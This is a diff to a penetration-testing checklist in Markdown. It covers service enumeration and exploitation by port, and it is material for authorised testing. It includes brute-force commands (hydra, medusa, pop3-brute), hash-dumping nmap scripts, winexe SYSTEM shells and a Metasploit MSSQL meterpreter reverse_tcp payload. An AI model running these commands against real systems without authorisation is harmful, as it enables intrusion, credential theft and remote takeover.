@@ -67,8 +67,14 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 ### FTP - TCP Port 21
 - [ ] [Banner grabbing](#grab-the-damn-banner)
 - [ ] Connect and check for anonymous access
-- [ ] Any known vulnerabilty?
-> nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+	- [ ] Check with nmap
+	> nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -Pn -oN nmap/ftpVuln -p 21 $IP
 - [ ] Default credentials check
 > hydra -s \<PORT\> -C usr/share/wordlists/ftp-default-userpass.txt -u -f $IP ft  
 ### SSH (22)
@@ -88,15 +94,29 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 - [ ] Use requested MAC
 > ssh user@$IP -m {MAC}
 ### SMTP - TCP Port 25
+- [ ] Enumeration with nmap
+>  nmap –script smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay -Pn -oN nmap/smtpEnum -p 25,465,587 $IP
 - [ ] nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+	- [ ] Check with nmap
+	> nmap –script smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -Pn -p 25,465,587 -oN nmap/smtpVuln $IP
 - [ ] nc -nvv $IP
 - [ ] manual testing with **telnet** and VRFY / EXPN
 ### Finger (79)
 - [ ] Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)
 > finger-user-enum.pl -U users.txt -t $IP
 ### Web App (80/443)
+#### Phase Alpha - enumeration
 - [ ] Investigate SSL/TLS cert details for further information
-- [ ] Investigate robots.txt
+- [ ] Investigate **robots.txt**
+- [ ] Investigate **crossdomain.xml**
+- [ ] Investigate **clientaccesspolicy.xml**
+- [ ] Identify all parameters. Document which parameters are used for **GET** and **POST**
 - [ ] View source code
 - [ ] Nikto
 - [ ] Directory Traversal Fuzzer
@@ -110,18 +130,44 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 		- [ ] Re-run for each directory found
 	- [ ] wfuzz
 	- [ ] dotdotpwn
-- [ ] Which CMS is running?
-	- [ ] whatweb
-	- [ ] wpscan
-	- [ ] joomscan
-	- [ ] drupwn
-	- [ ] use nmap to enumerates installed Drupal themes/modules
-	> nmap -p 80 --script http-drupal-enum <\TARGET\>
+- [ ] WhatWeb & weppalyzer to map the whole infrastructure:
+	- [ ] Middleware
+	- [ ] Programming languages
+	- [ ] Backends
+	- [ ] Services
+	- [ ] Plugins
+	- [ ] Which CMS is running?
+		- [ ] wpscan
+		- [ ] joomscan
+		- [ ] drupwn
+		- [ ] use nmap to enumerates installed Drupal themes/modules
+		> nmap -p 80 --script http-drupal-enum <\TARGET\>
 - [ ] WebDAV:
 	- [ ] davtest
 	- [ ] cadevar
 	- [ ] Use nmap to detect WebDAV installations & listings:
 	> nmap --script http-webdav-scan -p80,8080 $IP
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+- [ ] Check comments in source of all pages
+> nmap -p80 --script http-comments-displayer -oN nmap/commentHTTP $IP
+- [ ] RTFM! Read the manual for the application you are testing
+	- [ ] Does it have a dev mode?
+	- [ ] DEBUG=TRUE flag to see more?
+	- [ ] Other interesting stuff?
+- [ ] Look for where you can put data
+	- [ ] API
+	- [ ] Paywall or sign up
+	- [ ] Unauthenticated
+- [ ] Logical reasoning
+	- [ ] Look at the application from a bad guy perspective, what does it do? what is the most valuable part? Some applications will value things more than others, for example a premium website might be more concerned about users being able to bypass the pay wall than they are of say cross-site scripting
+	- [ ] Look at the application logic too, how is business conducted?
+#### Phase Bravo - go deeper
+- [ ] Follow webapp testing methodology [[webapp_testing_methodology🌐]]
 - [ ] LFI / RFI test
 - [ ] cgi-bin found? try shellshock [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)
 - [ ] Check every input field for SQLi
@@ -130,6 +176,7 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 	- [ ] Cheatsheet 3 [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/  
 ](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
 - [ ] Check for code injection: [Owasp code injection](https://owasp.org/www-community/attacks/Code_Injection)
+
 ### DNS (Port 53)
 - [ ] Find domain names for host
 > whois $IP
@@ -151,16 +198,33 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 
 	> dnsrecon -d domain.com -t axfr
 - [ ] dnsrecon -d $IP -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
-
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+	
 ###  POP (Port 110)
 - [ ] Is username enumeration possible?
-- [ ] Try nmap -script pop3-brute $IP -p 110 -v
+- [ ] Nmap enumeration (Default scripts runned with -sC flag):
+	> nmap --script pop3-capabilities -Pn -oN nmap/popCapabilities -p 110,995 $IP
+
+	> nmap --script pop3-ntlm-info -Pn -oN nmap/popInfo -p 110,995 $IP
 - [ ] telnet $IP 110
 	- USER user@IP
 	- PASS admin
 	- LIST - once logged in list messages
 	- RETR \<MSG NUMBER\> - retrieve message
 	- QUIT
+- [ ] Bruteforce with nmap
+> nmap -n -v -script pop3-brute -p 110 $IP 
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
 
 ### RPCBind (111)
 - [ ] rpcinfo -p $IP
@@ -178,10 +242,6 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 	> nmap -script smb-enum-users.nse –script-args=unsafe=1 -p445 $IP
 
 	> nmap -script smb-protocols $IP
-- [ ] nmap -n -p 139,445 -v --script smb-vuln* -oA nmap/smb-vulns  $IP
-- [ ] nmap -script smb-os-discovery.nse –script-args=unsafe=1 -p445 $IP
-- [ ] nmap -script smb-check-vulns.nse –script-args=unsafe=1 -p445 $IP
-
 - [ ] nbtscan
 - [ ] enum4linux
 - [ ] Manual browsing (Prefer it whenever possible):
@@ -191,7 +251,16 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 > smbclient //INSERTIPADDRESS/ipc$ -U john
 > smbclient //INSERTIPADDRESS/admin$ -U john
 > winexe -U username //INSERTIPADDRESS "cmd.exe" --system
-
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+	- [ ] Check with nmap
+	> nmap -n -v --script="smb-vuln*" -oN nmap/smbAllVulns  -p 139,445 $IP
+	> nmap -n -v -script smb-os-discovery.nse –script-args=unsafe=1 -oN nmap/smbOS -p 445 $IP
+	> nmap -n -v script smb-check-vulns –script-args=unsafe=1 -oN nmap/smbCehckVulns -p445 $IP
 ### SNMP (161)
 - [ ] Enumeration
 	> for community in public private manager; do snmpwalk -c $community -v1 $IP; done
@@ -205,8 +274,12 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 	> nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes $ip
 - [ ] Bruteforce community names
 > onesixtyone -c names -i hosts # fast
-
-
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
 
 ### MSSQL
 - [ ] Enumerate MSSQL Servers
@@ -221,14 +294,19 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 	> medusa -h $IP -M mssql -u sa -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -e ns -F -t 5
 
 	> msf > use auxiliary/scanner/mssql/mssql_login
-- [ ] Any known vulnerability?
-> nmap -vv -sV -Pn -p \<PORT\> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa $IP
 - [ ] Gain shell using gathered credentials
 > msf > use exploit/windows/mssql/mssql_payload
 > msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
 - [ ] Log in to a MSSQL Server
 > sqsh -S $IP -U sa -P password -D db_name
-
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+	- [ ] Check with nmap
+	> nmap -vv -sV -Pn -p \<PORT\> --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa $IP
 ### Oracle (1521)
 -  [ ] Default credentials
 > hydra -s \[PORT\] -C ./wordlists/oracle-default-userpass.txt -u -f $IP
@@ -238,12 +316,23 @@ If you don't know the alive hosts,  you can scan the full subnet to find them, s
 > msfcli auxiliary/scanner/oracle/tnslsnr\_version rhosts=$IP E
 - [ ] **oracle-sid** \- MSF module to enumerate the Oracle DB SID
 > msfcli auxiliary/scanner/oracle/sid\_enum rhosts=$IP E
-
+- [ ] Any known vulnerability?
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
 ### MySQL (3306)
 - [ ] Default credentials?
 > hydra -s \<PORT\> -C usr/share/wordlists/mysql-default-userpass.txt -u -f $IP mysql
 - [ ] Any known vulnerability?
-> nmap -sV -Pn -vv -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $IP
+	- [ ] Check https://www.exploit-db.com/
+	- [ ] Check https://www.cvedetails.com/
+	- [ ] Check https://nvd.nist.gov/
+	- [ ] Check on google
+	> site:github.com *Service version.release*
+	- [ ] Check with nmap
+	> nmap -sV -Pn -vv --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 $IP
 
 ### RDP (3389)
 - [ ] Use rpd-sec-check to enumerate security settings:
